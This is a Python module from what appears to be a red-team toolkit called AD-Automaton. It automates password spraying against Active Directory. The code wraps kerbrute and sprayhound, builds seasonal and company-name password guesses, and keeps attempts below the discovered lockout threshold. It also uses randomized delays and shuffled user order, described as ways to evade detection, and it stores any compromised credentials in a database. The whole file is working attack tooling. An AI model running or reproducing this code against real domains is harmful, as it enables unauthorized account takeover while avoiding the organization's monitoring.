#!/usr/bin/env python3
"""
Password Spraying Module for AD-Automaton
Performs strategic password spraying attacks with OPSEC considerations.
Based on the "precision strike" methodology from red team field manual.
"""

import os
import re
import time
import random
import logging
import tempfile
from typing import List, Dict, Any, Optional, Tuple
from datetime import datetime, timedelta

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, User, Host
from executor import CommandExecutor
from parsers import KerbruteParser, LDAPParser
from logger import log_discovery, log_tool_execution, log_tool_result

class PasswordSprayer:
    """
    Handles strategic password spraying attacks with OPSEC considerations.
    Implements "low-and-slow" methodology to avoid detection and account lockouts.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the password sprayer.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.kerbrute_parser = KerbruteParser()
        self.ldap_parser = LDAPParser()
        
        # Get tool configurations
        self.kerbrute_config = config.get('tools', {}).get('kerbrute', {})
        self.kerbrute_path = self.kerbrute_config.get('path', 'kerbrute')
        
        self.sprayhound_config = config.get('tools', {}).get('sprayhound', {})
        self.sprayhound_path = self.sprayhound_config.get('path', 'sprayhound')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_password_spraying', True)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        self.policy_discovery_method = config.get('password_spraying', {}).get('policy_discovery', 'ldap')  # 'ldap' or 'powershell'
        
        # Spray configuration
        self.spray_config = config.get('password_spraying', {})
        self.default_passwords = self.spray_config.get('default_passwords', [
            'Welcome1', 'Password1', 'Summer2024!', 'Spring2024!', 'Winter2024!',
            'Fall2024!', 'Company123!', 'Password123!', 'Welcome123!'
        ])
        self.max_attempts_per_user = self.spray_config.get('max_attempts_per_user', 1)
        self.spray_delay_min = self.spray_config.get('delay_min_seconds', 300)  # 5 minutes default
        self.spray_delay_max = self.spray_config.get('delay_max_seconds', 900)  # 15 minutes default
        
        # Safety thresholds
        self.lockout_threshold = None
        self.lockout_duration = None
        
        # Output directory
        self.output_dir = config.get('output', {}).get('spray_dir', '/tmp/ad-automaton-spray')
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_password_spray_campaign(self, target_passwords: Optional[List[str]] = None, 
                                  target_users: Optional[List[str]] = None) -> List[Credential]:
        """
        Main method to run a comprehensive password spraying campaign.
        
        Args:
            target_passwords: Optional list of passwords to spray
            target_users: Optional list of specific users to target
            
        Returns:
            List of successfully compromised credentials
        """
        if not self.enabled:
            self.logger.info("Password spraying is disabled in configuration")
            return []
        
        self.logger.info("Starting password spraying campaign")
        
        # Phase 1: Discover password policy for safety
        if not self._discover_password_policy():
            self.logger.error("Could not determine password policy - aborting spray for safety")
            return []
        
        # Phase 2: Enumerate target users
        if target_users:
            users = target_users
        else:
            users = self._enumerate_target_users()
        
        if not users:
            self.logger.warning("No target users identified for password spraying")
            return []
        
        # Phase 3: Prepare password list
        passwords = target_passwords if target_passwords else self._generate_password_list()
        
        # Phase 4: Execute spray campaign with OPSEC
        successful_credentials = self._execute_spray_campaign(users, passwords)
        
        # Phase 5: Store results
        if successful_credentials:
            self._store_credentials(successful_credentials)
        
        log_discovery("Password spray credentials", len(successful_credentials))
        
        return successful_credentials
    
    def _discover_password_policy(self) -> bool:
        """
        Discover domain password policy to avoid account lockouts.
        Critical OPSEC step - determines spray safety parameters.
        
        Returns:
            True if policy discovered successfully, False otherwise
        """
        self.logger.info("Discovering domain password policy for spray safety")
        
        # Get domain controllers
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            self.logger.warning("No domain controllers found for policy discovery")
            return False
        
        target_dc = domain_controllers[0]
        
        if self.policy_discovery_method == 'powershell':
            return self._discover_policy_powershell()
        else:
            return self._discover_policy_ldap(target_dc)
    
    def _discover_policy_ldap(self, dc_host: Host) -> bool:
        """
        Discover password policy using LDAP queries (stealthier method).
        
        Args:
            dc_host: Domain controller to query
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Get domain name from existing data
            domain_name = self._get_domain_name()
            if not domain_name:
                self.logger.error("Could not determine domain name for policy discovery")
                return False
            
            # Construct ldapsearch command for policy discovery
            cmd_parts = [
                'ldapsearch',
                '-x',  # Simple authentication
                '-H', f'ldap://{dc_host.ip_address}',
                '-b', f'DC={domain_name.replace(".", ",DC=")}',
                '-s', 'base',
                '(objectClass=*)',
                'lockoutThreshold', 'lockoutDuration', 'maxPwdAge', 'minPwdLength'
            ]
            
            cmd = ' '.join(cmd_parts)
            
            log_tool_execution("ldapsearch policy", cmd)
            result = self.executor.execute_command(cmd, timeout=60)
            log_tool_result("ldapsearch policy", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_ldap_policy_output(result.stdout)
            else:
                self.logger.warning(f"LDAP policy discovery failed: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error in LDAP policy discovery: {e}")
            return False
    
    def _discover_policy_powershell(self) -> bool:
        """
        Discover password policy using PowerShell (faster but noisier).
        
        Returns:
            True if successful, False otherwise
        """
        # This would typically be run from a domain-joined Windows machine
        cmd = 'powershell.exe -Command "Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold,LockoutDuration,MaxPasswordAge,MinPasswordLength | ConvertTo-Json"'
        
        try:
            log_tool_execution("PowerShell policy", cmd)
            result = self.executor.execute_command(cmd, timeout=60)
            log_tool_result("PowerShell policy", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_powershell_policy_output(result.stdout)
            else:
                self.logger.warning(f"PowerShell policy discovery failed: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error in PowerShell policy discovery: {e}")
            return False
    
    def _parse_ldap_policy_output(self, output: str) -> bool:
        """Parse LDAP policy output to extract safety parameters."""
        try:
            lockout_threshold_match = re.search(r'lockoutThreshold:\s*(\d+)', output)
            lockout_duration_match = re.search(r'lockoutDuration:\s*(-?\d+)', output)
            
            if lockout_threshold_match:
                self.lockout_threshold = int(lockout_threshold_match.group(1))
                self.logger.info(f"Discovered lockout threshold: {self.lockout_threshold}")
            
            if lockout_duration_match:
                duration_raw = int(lockout_duration_match.group(1))
                # Convert from 100-nanosecond intervals to minutes
                self.lockout_duration = abs(duration_raw) // (10000000 * 60)
                self.logger.info(f"Discovered lockout duration: {self.lockout_duration} minutes")
            
            # Set conservative defaults if not found
            if self.lockout_threshold is None:
                self.lockout_threshold = 5  # Conservative default
                self.logger.warning("Could not determine lockout threshold, using conservative default: 5")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error parsing LDAP policy output: {e}")
            return False
    
    def _parse_powershell_policy_output(self, output: str) -> bool:
        """Parse PowerShell JSON policy output."""
        try:
            import json
            policy_data = json.loads(output)
            
            if 'LockoutThreshold' in policy_data:
                self.lockout_threshold = policy_data['LockoutThreshold']
                self.logger.info(f"Discovered lockout threshold: {self.lockout_threshold}")
            
            if 'LockoutDuration' in policy_data:
                # PowerShell returns TimeSpan, extract minutes
                duration_str = policy_data['LockoutDuration']
                minutes_match = re.search(r'(\d+):(\d+):(\d+)', duration_str)
                if minutes_match:
                    hours, minutes, seconds = map(int, minutes_match.groups())
                    self.lockout_duration = hours * 60 + minutes
                    self.logger.info(f"Discovered lockout duration: {self.lockout_duration} minutes")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error parsing PowerShell policy output: {e}")
            return False
    
    def _enumerate_target_users(self) -> List[str]:
        """
        Enumerate target users for spraying, avoiding high-value accounts.
        
        Returns:
            List of usernames suitable for spraying
        """
        # Get users from database (previously enumerated)
        users = self._get_users_from_database()
        
        if not users:
            self.logger.warning("No users found in database, attempting LDAP enumeration")
            users = self._enumerate_users_via_ldap()
        
        # Filter for spray targets (avoid admin accounts, service accounts, etc.)
        spray_targets = []
        
        for user in users:
            username = user if isinstance(user, str) else user.username
            
            # Skip obvious admin/service accounts
            if self._is_high_value_account(username):
                continue
            
            # Skip disabled accounts
            if hasattr(user, 'is_enabled') and not user.is_enabled:
                continue
            
            spray_targets.append(username)
        
        # Randomize order for OPSEC
        random.shuffle(spray_targets)
        
        self.logger.info(f"Selected {len(spray_targets)} users for password spraying")
        return spray_targets
    
    def _is_high_value_account(self, username: str) -> bool:
        """Identify high-value accounts to avoid in initial spray."""
        high_value_indicators = [
            'admin', 'administrator', 'domain', 'enterprise', 'root', 'sa',
            'service', 'svc', 'sql', 'backup', 'test', 'guest', 'krbtgt'
        ]
        
        username_lower = username.lower()
        return any(indicator in username_lower for indicator in high_value_indicators)
    
    def _generate_password_list(self) -> List[str]:
        """Generate season/year-aware password list."""
        current_date = datetime.now()
        current_year = current_date.year
        
        # Generate seasonal passwords
        seasonal_passwords = []
        seasons = ['Spring', 'Summer', 'Fall', 'Winter']
        
        for season in seasons:
            seasonal_passwords.extend([
                f"{season}{current_year}",
                f"{season}{current_year}!",
                f"{season}{str(current_year)[2:]}",
                f"{season}{str(current_year)[2:]}!"
            ])
        
        # Combine with default passwords
        all_passwords = self.default_passwords + seasonal_passwords
        
        # Add company name if available
        company_name = self.config.get('target', {}).get('company_name')
        if company_name:
            all_passwords.extend([
                f"{company_name}123",
                f"{company_name}123!",
                f"{company_name}{current_year}",
                f"{company_name}{current_year}!"
            ])
        
        # Remove duplicates and return
        return list(set(all_passwords))
    
    def _execute_spray_campaign(self, users: List[str], passwords: List[str]) -> List[Credential]:
        """
        Execute the actual password spray with OPSEC timing.
        
        Args:
            users: List of target usernames
            passwords: List of passwords to spray
            
        Returns:
            List of successful credentials
        """
        successful_credentials = []
        
        # Calculate safe attempt count based on lockout threshold
        safe_attempts = min(self.max_attempts_per_user, self.lockout_threshold - 1) if self.lockout_threshold else 1
        
        self.logger.info(f"Beginning spray campaign: {len(users)} users, {len(passwords)} passwords")
        self.logger.info(f"Safety limit: {safe_attempts} attempts per user")
        
        attempt_count = 0
        
        for password in passwords[:safe_attempts]:
            self.logger.info(f"Starting spray round {attempt_count + 1} with password: {password}")
            
            # Use different tools based on OPSEC profile
            if self.opsec_profile == 'stealth':
                round_results = self._spray_with_kerbrute(users, password)
            else:
                round_results = self._spray_with_sprayhound(users, password)
            
            successful_credentials.extend(round_results)
            attempt_count += 1
            
            # OPSEC delay between spray rounds
            if attempt_count < safe_attempts:
                delay = random.randint(self.spray_delay_min, self.spray_delay_max)
                self.logger.info(f"OPSEC delay: waiting {delay} seconds before next spray round")
                time.sleep(delay)
        
        return successful_credentials
    
    def _spray_with_kerbrute(self, users: List[str], password: str) -> List[Credential]:
        """
        Perform password spray using kerbrute (Kerberos-based, stealthier).
        
        Args:
            users: List of usernames
            password: Password to spray
            
        Returns:
            List of successful credentials
        """
        # Get domain info
        domain_name = self._get_domain_name()
        domain_controllers = self._get_domain_controllers()
        
        if not domain_name or not domain_controllers:
            self.logger.error("Missing domain information for kerbrute spray")
            return []
        
        target_dc = domain_controllers[0]
        
        # Create temporary user list file
        users_file = os.path.join(self.output_dir, f'users_{int(time.time())}.txt')
        try:
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            # Construct kerbrute command
            cmd_parts = [
                self.kerbrute_path,
                'passwordspray',
                '-d', domain_name,
                '--dc', target_dc.ip_address,
                users_file,
                password
            ]
            
            cmd = ' '.join(cmd_parts)
            
            log_tool_execution("kerbrute spray", f"kerbrute passwordspray -d {domain_name} [users] [password]")
            result = self.executor.execute_command(cmd, timeout=300)
            log_tool_result("kerbrute spray", result.returncode == 0)
            
            if result.returncode == 0:
                return self.kerbrute_parser.parse_spray_output(result.stdout, domain_name)
            else:
                self.logger.warning(f"Kerbrute spray failed: {result.stderr}")
                return []
        
        finally:
            # Clean up temporary file
            if os.path.exists(users_file):
                os.remove(users_file)
    
    def _spray_with_sprayhound(self, users: List[str], password: str) -> List[Credential]:
        """
        Perform password spray using sprayhound (more features, less stealthy).
        
        Args:
            users: List of usernames
            password: Password to spray
            
        Returns:
            List of successful credentials
        """
        # Get domain info
        domain_name = self._get_domain_name()
        domain_controllers = self._get_domain_controllers()
        
        if not domain_name or not domain_controllers:
            self.logger.error("Missing domain information for sprayhound spray")
            return []
        
        target_dc = domain_controllers[0]
        
        # Create users file
        users_file = os.path.join(self.output_dir, f'sprayhound_users_{int(time.time())}.txt')
        try:
            with open(users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            # Construct sprayhound command with safety threshold
            cmd_parts = [
                self.sprayhound_path,
                '-d', domain_name,
                '-dc', target_dc.ip_address,
                '-p', password,
                '--threshold', '1',  # Only spray accounts with 0 bad password count
                '--delay', str(random.randint(1, 5)),  # Random delay between attempts
                '-U', users_file
            ]
            
            cmd = ' '.join(cmd_parts)
            
            log_tool_execution("sprayhound", f"sprayhound -d {domain_name} -p [password] --threshold 1")
            result = self.executor.execute_command(cmd, timeout=600)
            log_tool_result("sprayhound", result.returncode == 0)
            
            if result.returncode == 0:
                return self._parse_sprayhound_output(result.stdout, domain_name)
            else:
                self.logger.warning(f"Sprayhound failed: {result.stderr}")
                return []
        
        finally:
            # Clean up temporary file
            if os.path.exists(users_file):
                os.remove(users_file)
    
    def _parse_sprayhound_output(self, output: str, domain: str) -> List[Credential]:
        """Parse sprayhound output for successful credentials."""
        credentials = []
        
        # Look for successful authentication lines
        success_pattern = r'\[SUCCESS\]\s+(\S+):(\S+)'
        
        for match in re.finditer(success_pattern, output):
            username, password = match.groups()
            
            credential = Credential(
                username=username,
                domain=domain,
                password=password,
                source_tool='sprayhound'
            )
            
            credentials.append(credential)
            self.logger.info(f"Password spray success: {domain}\\{username}")
        
        return credentials
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _get_domain_name(self) -> Optional[str]:
        """Extract domain name from database or configuration."""
        # Try to get from existing credentials
        query = "SELECT DISTINCT domain FROM Credentials WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Try to get from users
        query = "SELECT DISTINCT domain FROM Users WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Fall back to configuration
        return self.config.get('target', {}).get('domain')
    
    def _get_users_from_database(self) -> List[User]:
        """Get users from the database."""
        query = "SELECT * FROM Users ORDER BY username"
        rows = self.db_manager.execute_query(query)
        
        users = []
        for row in rows:
            user = User(
                user_id=row[0],
                username=row[1],
                domain=row[2],
                sid=row[3],
                description=row[4],
                is_enabled=bool(row[5]),
                is_admin=bool(row[6])
            )
            users.append(user)
        
        return users
    
    def _enumerate_users_via_ldap(self) -> List[str]:
        """Enumerate users via LDAP if not in database."""
        # This would implement LDAP user enumeration
        # For now, return empty list and log warning
        self.logger.warning("LDAP user enumeration not yet implemented")
        return []
    
    def _store_credentials(self, credentials: List[Credential]) -> None:
        """Store successful credentials in the database."""
        for cred in credentials:
            try:
                self.db_manager.add_credential(cred)
                self.logger.info(f"Stored password spray credential: {cred.domain}\\{cred.username}")
            except Exception as e:
                self.logger.error(f"Error storing credential: {e}")


def run_password_spray_campaign(db_manager: DatabaseManager, config: Dict[str, Any], 
                               target_passwords: Optional[List[str]] = None,
                               target_users: Optional[List[str]] = None) -> List[Credential]:
    """
    Main entry point for password spraying module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        target_passwords: Optional list of passwords to spray
        target_users: Optional list of users to target
        
    Returns:
        List of successful credentials
    """
    sprayer = PasswordSprayer(db_manager, config)
    return sprayer.run_password_spray_campaign(target_passwords, target_users) 